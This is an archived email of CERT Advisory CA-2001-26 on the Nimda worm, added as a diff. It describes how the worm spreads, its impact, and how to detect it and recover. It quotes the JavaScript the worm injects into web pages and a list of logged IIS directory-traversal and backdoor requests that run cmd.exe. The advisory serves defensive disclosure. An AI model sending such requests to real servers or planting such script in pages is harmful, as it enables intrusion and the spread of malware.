@@ -1,0 +1,395 @@
+Received: from canaveral.red.cert.org (canaveral.red.cert.org [192.88.209.11])
+	by uclink4.berkeley.edu (8.11.4/8.11.4) with ESMTP id f8J1dPF29926;
+	Tue, 18 Sep 2001 18:39:25 -0700 (PDT)
+Received: from localhost (lnchuser@localhost)
+	by canaveral.red.cert.org (8.9.3/8.9.3/1.11) with SMTP id TAA20669;
+	Tue, 18 Sep 2001 19:33:41 -0400 (EDT)
+Date: Tue, 18 Sep 2001 19:33:41 -0400 (EDT)
+Received: by canaveral.red.cert.org; Tue, 18 Sep 2001 19:28:42 -0400
+Message-Id: <CA-2001-26.1@cert.org>
+From: CERT Advisory <cert-advisory@cert.org>
+To: cert-advisory@cert.org
+Organization: CERT(R) Coordination Center - +1 412-268-7090
+List-Help: <http://www.cert.org/>, <mailto:Majordomo@cert.org?body=help>
+List-Subscribe: <mailto:Majordomo@cert.org?body=subscribe%20cert-advisory>
+List-Unsubscribe: <mailto:Majordomo@cert.org?body=unsubscribe%20cert-advisory>
+List-Post: NO (posting not allowed on this list)
+List-Owner: <mailto:cert-advisory-owner@cert.org>
+List-Archive: <http://www.cert.org/>
+Subject: CERT Advisory CA-2001-26
+X-Mozilla-Status: 8001
+X-Mozilla-Status2: 00000000
+X-UIDL: 67b43e3b48a8286a20d42579ad3202e0
+Status: RO
+X-Status: $$$$
+X-UID: 0000000022
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+
+CERT Advisory CA-2001-26 Nimda Worm
+
+   Original release date: September 18, 2001
+   Source: CERT/CC
+
+   A complete revision history is at the end of this file.
+
+Systems Affected
+
+     * Systems running Microsoft Windows 95, 98, ME, NT, and 2000
+
+Overview
+
+   The  CERT/CC  has  received reports of new malicious code known as the
+   "W32/Nimda  worm"  or  the  "Concept  Virus  (CV)  v.5." This new worm
+   appears to spread by multiple mechanisms:
+
+     * from client to client via email
+
+     * from client to client via open network shares
+
+     * from web server to client via browsing of compromised web sites
+
+     * from client to web server via active scanning for and exploitation
+       of the "Microsoft IIS 4.0 / 5.0 directory traversal" vulnerability
+       (VU #111677)
+
+     * from  client  to  web  server via scanning for the back doors left
+       behind  by  the  "Code  Red  II"  (IN-2001-09),  and "sadmind/IIS"
+       (CA-2001-11) worms
+
+   Initial  analysis  indicates  that  the  worm  contains no destructive
+   payload  beyond  modification  of  web  content  to facilitate its own
+   propagation.
+
+   We  are  also  receiving  reports  of denial of service as a result of
+   network scanning and email propagation.
+
+I. Description
+
+   The  Nimda  worm  has  the  potential to affect both user workstations
+   (clients)  running Windows 95, 98, ME, NT, or 2000 and servers running
+   Windows NT and 2000.
+
+   Email Propagation
+
+   This    worm   propagates   through   email   arriving   as   a   MIME
+   "multipart/alternative"  message consisting of two sections. The first
+   section  is defined as MIME type "text/html", but it contains no text,
+   so the email appears to have no content. The second section is defined
+   as   MIME   type  "audio/x-wav",  but  it  contains  a  base64-encoded
+   attachment named "readme.exe", which is a binary executable.
+
+   Due to a vulnerability described in CA-2001-06 (Automatic Execution of
+   Embedded  MIME  Types),  any  mail software running on an x86 platform
+   that  uses  Microsoft  Internet Explorer 5.5 SP1 or earlier (except IE
+   5.01  SP2)  to  render  the  HTML mail automatically runs the enclosed
+   attachment and, as result, infects the machine with the worm. Thus, in
+   vulnerable  configurations,  the  worm  payload  will automatically be
+   triggered  by  simply opening (or previewing) this mail message. As an
+   executable binary, the payload can also be triggered by simply running
+   the attachment.
+
+   The  email  message delivering the Nimda worm appears to also have the
+   following characteristics:
+
+     * The  text  in  the  subject line of the mail message appears to be
+       variable,  but  those  seen  to  date have been over 80 characters
+       long.
+
+     * There  appear  to  be  many slight variations in the attach binary
+       file,  causing  the MD5 checksum to be different when one compares
+       different  attachments from different email messages. However, the
+       file  length  of  the  attachment appears to consistently be 57344
+       bytes.
+
+   Payload
+
+   Infected  client machines attempt to send copies of the Nimda worm via
+   email to all addresses found in the Windows address book.
+
+   Likewise,  the  client  machines  begin  scanning  for  vulnerable IIS
+   servers.  Nimda  looks  for backdoors left by previous IIS worms: Code
+   Red  II  [IN-2001-09]  and  sadmind/IIS  worm  [CA-2001-11].  It  also
+   attempts  to  exploit  the  IIS  Directory Traversal vulnerability (VU
+   #111677). The selection of potential target IP addresses follows these
+   rough probabilities:
+
+     * 50% of the time, an address with the same first two octets will be
+       chosen
+
+     * 25%  of  the  time,  an  address with the same first octet will be
+       chosen
+
+     * 25% of the time, a random address will be chosen
+
+   The  infected client machine transfers a copy of the Nimda code to any
+   server  that  it scans and finds to be vulnerable. Once running on the
+   server  machine,  the  worm  traverses  each  directory  in the system
+   (including  all  those  accessible  through a file shares) and write a
+   copy  of  itself to disk using the name "README.EML". When a directory
+   containing  web  content  (e.g.,  HTML  or  ASP  files)  is found, the
+   following snippet of Javascript code is appended to every one of these
+   web-related files:
+
+   <script language="JavaScript">
+   window.open("readme.eml", null, "resizable=no,top=6000,left=6000")
+   </script>
+
+   This  modification  of  web  content allows further propagation of the
+   worm  to  new  clients through a browser or browsing of a network file
+   system.
+
+   Browser Propagation
+
+   As  part  of  the  infection  process, the Nimda worm modifies all web
+   content  files  it  finds  (including,  but not limited to, files with
+   .htm,  .html, and .asp extensions). As a result, any user browsing web
+   content  on  the  system,  whether  via  the  file system or via a web
+   server,   may   download  a  copy  of  the  worm.  Some  browsers  may
+   automatically  execute  the  downloaded  copy,  thereby  infecting the
+   browsing system.
+
+   File System Propagation
+
+   The  Nimda  worm  creates  numerous  copies  of itself (using the name
+   README.EML)  in  all  writable directories (including those found on a
+   network  share)  to  which  the  user has access. If a user on another
+   system  subsequently  selects  the copy of the worm file on the shared
+   network drive in Windows Explorer with the preview option enabled, the
+   worm may be able to compromise that system.
+
+   System FootPrint
+
+   The  scanning  activity  of  the Nimda worm produces the following log
+   entries for any web server listing on port 80/tcp:
+
+   GET /scripts/root.exe?/c+dir
+   GET /MSADC/root.exe?/c+dir
+   GET /c/winnt/system32/cmd.exe?/c+dir
+   GET /d/winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..%5c../winnt/system32/cmd.exe?/c+dir
+   GET /_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
+   GET /_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
+   GET /msadc/..%5c../..%5c../..%5c/..\xc1\x1c../..\xc1\x1c../..\xc1\x1c../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..\xc1\x1c../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..\xc0/../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..\xc0\xaf../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..\xc1\x9c../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..%35c../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..%35c../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..%5c../winnt/system32/cmd.exe?/c+dir
+   GET /scripts/..%2f../winnt/system32/cmd.exe?/c+dir
+
+   Note:  The  first four entries in these sample logs denote attempts to
+   connect  to  the backdoor left by Code Red II, while the remaining log
+   entries  are  examples of exploit attempts for the Directory Traversal
+   vulnerability.
+
+II. Impact
+
+   Intruders  can  execute  arbitrary  commands  within  the  LocalSystem
+   security  context  on  machines running the unpatched versions of IIS.
+   Host  that have been compromised are also at high risk for being party
+   to attacks on other Internet sites.
+
+   The  high  scanning  rate  of  the Nimda worm may also cause bandwidth
+   denial-of-service conditions on networks with infected machines.
+
+III. Solutions
+
+   Recommendations for System Administrators of IIS machines
+
+   To  determine  if  your  system  has  been  compromised,  look for the
+   following:
+
+     * root.exe  artifact  (indicates  a  compromise  by  Code  Red II or
+       sadmind/IIS worms making the system vulnerable to the Nimda worm)
+
+     * admin.dll  artifact  or  unexpected  .eml files in the directories
+       with web content (indicates compromise by the Nimda worm)
+
+   The  only  safe way to recover from the system compromise is to format
+   the  system  drive(s)  and  reinstall the system software from trusted
+   media  (such  as  vendor-supplied  CD-ROM).  Additionally,  after  the
+   software  is reinstalled, all vendor-supplied security patches must be
+   applied.  The  recommended  time to do this is while the system is not
+   connected  to  any  network.  However,  if sufficient care is taken to
+   disable   all  server  network  services,  then  the  patches  can  be
+   downloaded from the Internet.
+
+   Detailed  instructions  for recovering your system can be found in the
+   CERT/CC tech tip:
+
+          Steps for Recovering from a UNIX or NT System Compromise
+          http://www.cert.org/tech_tips/win-UNIX-system_compromise.html
+
+   Apply the appropriate patch from your vendor
+
+   A   cumulative   patch   which   addresses   all  of  the  IIS-related
+   vulnerabilities   exploited  by  the  Nimda  worm  is  available  from
+   Microsoft at
+
+          http://www.microsoft.com/technet/security/bulletin/MS01-044.asp
+
+   Recommendations for End User Systems
+
+   Apply the appropriate patch from your vendor
+
+   If you are running a vulnerable version of Internet Explorer (IE), the
+   CERT/CC  recommends  applying  patch  for  the "Automatic Execution of
+   Embedded MIME Types" vulnerability available from Microsoft at
+
+          http://www.microsoft.com/technet/security/bulletin/MS01-020.asp
+
+   Run and Maintain an Anti-Virus Product
+
+   It  is  important  for users to update their anti-virus software. Most
+   anti-virus  software vendors have released updated information, tools,
+   or  virus  databases  to  help  detect and partially recover from this
+   malicious  code.  A list of vendor-specific anti-virus information can
+   be found in Appendix A.
+
+   Many   anti-virus   packages   support   automatic  updates  of  virus
+   definitions.   We   recommend   using  these  automatic  updates  when
+   available.
+
+   Don't open e-mail attachments
+
+   The  Nimda  worm may arrive as an email attachment named "readme.exe".
+   Users should not open this attachment.
+
+   Disable  JavaScript  End-user  systems  can become infected with the
+   Nimda  worm  by  browsing  web  sites hosted by infected servers. This
+   method  of  infection requires the use of JavaScript to be successful.
+   Therefore,  the  CERT/CC  recommends  that  end  user  systems disable
+   JavaScript.
+
+Appendix A. Vendor Information
+
+   Antivirus Vendor Information
+
+   Central Command, Inc.
+
+          http://support.centralcommand.com/cgi-bin/command.cfg/php/endus
+          er/std_adp.php?p_refno=010918-000005
+
+   Command Software Systems
+
+          http://www.commandsoftware.com/virus/nimda.html
+
+   Data Fellows Corp
+
+          http://www.datafellows.com/v-descs/nimda.shtml
+
+   McAfee
+
+          http://vil.mcafee.com/dispVirus.asp?virus_k=99209&
+
+   Sophos
+
+          http://www.sophos.com/virusinfo/analyses/w32nimdaa.html
+
+   Symantec
+
+          http://www.symantec.com/avcenter/venc/data/w32.nimda.a@mm.html
+
+   Trend Micro
+
+          http://www.antivirus.com/vinfo/virusencyclo/default5.asp?VName=
+          TROJ_NIMDA.A
+
+          http://www.antivirus.com/pc-cillin/vinfo/virusencyclo/default5.
+          asp?VName=TROJ_NIMDA.A
+
+   You  may  wish  to  visit  the CERT/CC's computer virus resources page
+   located at 
+   
+     http://www.cert.org/other_sources/viruses.html
+
+References
+
+   Authors:   Roman  Danyliw,  Chad  Dougherty,  Allen Householder, Robin
+   Ruefle
+   ______________________________________________________________________
+
+   This document is available from:
+   http://www.cert.org/body/advisories/CA200126_FA200126.html
+   ______________________________________________________________________
+
+CERT/CC Contact Information
+
+   Email: cert@cert.org
+          Phone: +1 412-268-7090 (24-hour hotline)
+          Fax: +1 412-268-6989
+          Postal address:
+          CERT Coordination Center
+          Software Engineering Institute
+          Carnegie Mellon University
+          Pittsburgh PA 15213-3890
+          U.S.A.
+
+   CERT  personnel answer the hotline 08:00-20:00 EST(GMT-5) / EDT(GMT-4)
+   Monday  through  Friday; they are on call for emergencies during other
+   hours, on U.S. holidays, and on weekends.
+
+Using encryption
+
+   We  strongly  urge you to encrypt sensitive information sent by email.
+   Our public PGP key is available from
+
+   http://www.cert.org/CERT_PGP.key
+
+   If  you  prefer  to  use  DES,  please  call the CERT hotline for more
+   information.
+
+Getting security information
+
+   CERT  publications  and  other security information are available from
+   our web site
+
+   http://www.cert.org/
+
+   To  be  added  to  our mailing list for advisories and bulletins, send
+   email   to   cert-advisory-request@cert.org   and   include  SUBSCRIBE
+   your-email-address in the subject of your message.
+
+   *  "CERT"  and  "CERT  Coordination Center" are registered in the U.S.
+   Patent and Trademark Office.
+   ______________________________________________________________________
+
+   NO WARRANTY
+   Any  material furnished by Carnegie Mellon University and the Software
+   Engineering  Institute  is  furnished  on  an  "as is" basis. Carnegie
+   Mellon University makes no warranties of any kind, either expressed or
+   implied  as  to  any matter including, but not limited to, warranty of
+   fitness  for  a  particular purpose or merchantability, exclusivity or
+   results  obtained from use of the material. Carnegie Mellon University
+   does  not  make  any warranty of any kind with respect to freedom from
+   patent, trademark, or copyright infringement.
+     _________________________________________________________________
+
+   Conditions for use, disclaimers, and sponsorship information
+
+   Copyright 2001 Carnegie Mellon University.
+
+   Revision History
+
+   September 18, 2001: Initial Release
+
+
+
+
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGPfreeware 5.0i for non-commercial use
+Charset: noconv
+
+iQCVAwUBO6fYPgYcfu8gsZJZAQEG4QQAoblNKbAX/bVmJBdXy2Juf9OsMZeO2bR5
+UW6hi7ddDkdUNBe52du2wU+n34tSjzA3c+0g9tYwKSXFeOp+m/CCLeYEXR+VTTel
+RAmY1tOzDfMIDxD6+GrvfajYMz4pCGoSJgIdPGKxJm0Tnf6iv4akaYSAB4BPRw7A
+FVp6JcCbatg=
+=FizN
+-----END PGP SIGNATURE-----
+
